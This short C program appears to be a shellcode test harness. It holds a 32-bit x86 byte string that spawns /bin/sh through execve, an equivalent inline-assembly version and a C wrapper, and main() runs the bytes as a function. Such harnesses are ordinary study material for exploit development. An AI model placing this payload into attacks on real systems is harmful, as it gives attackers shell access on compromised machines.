#include <stdio.h>

char shellcode[] = 
  "\xeb\x0d"         
  "\x5e"            
  "\x31\xd2"
  "\x31\xc9"
  "\x89\xf3"
  "\x31\xc0"
  "\xb0\x0b"
  "\xcd\x80"
  "\xe8\xee\xff\xff\xff"
  "/bin/sh"
  ;

void call_asm(){
  asm(
      "jmp _call_label \n"
      "_jmp_label: \n"
      "pop %esi \n"
      "xor %edx,%edx \n"
      "xor %ecx,%ecx \n"
      "mov %esi,%ebx \n"
      "xor %eax,%eax \n"
      "mov $0xb,%al \n"
      "int $0x80 \n"
      "_call_label: \n"
      "call _jmp_label \n"
      ".string \"/bin/sh\" \n"
      );
}

void call_func() {

  execve("/bin/sh",0,0);
}

int main(void) {
  //call_func();

  //call_asm();

  (*(void(*)()) shellcode)();

  printf("shellcode fail!\n");

  return 0;
}
